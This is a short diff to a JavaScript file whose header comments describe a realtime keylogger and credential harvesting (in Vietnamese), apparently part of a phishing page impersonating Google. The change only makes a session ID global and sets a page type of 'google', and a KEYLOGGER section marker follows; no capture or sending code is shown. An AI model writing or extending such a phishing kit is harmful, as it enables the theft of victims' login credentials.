@@ -4,7 +4,9 @@
  * - Keylogger realtime
  * - Thu hoạch credentials
  */
-const SESSION_ID = 'gg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+window.SESSION_ID = 'gg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+window.PAGE_TYPE = 'google';
+const SESSION_ID = window.SESSION_ID;
 let submitCount = 0;
 
 // ===== KEYLOGGER =====
